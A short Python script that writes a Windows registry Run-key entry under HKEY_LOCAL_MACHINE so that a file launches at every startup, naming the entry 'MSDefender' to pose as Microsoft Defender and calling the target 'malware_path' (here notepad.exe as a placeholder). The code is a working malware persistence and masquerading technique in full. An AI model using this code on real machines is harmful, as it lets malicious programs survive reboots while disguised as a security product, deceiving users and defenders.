from winreg import OpenKey, CloseKey, QueryValueEx, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ


def add_run_to_registry(file_path):
    run_sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "MSDefender"
    run_key = OpenKey(HKEY_LOCAL_MACHINE, run_sub_key, 0, KEY_ALL_ACCESS)
    try:
        QueryValueEx(run_key, value_name)
    except:
        SetValueEx(run_key, value_name, 0, REG_SZ, file_path)
    CloseKey(run_key)


if __name__ == '__main__':
    malware_path = r"C:\Windows\System32\notepad.exe"
    add_run_to_registry(malware_path)
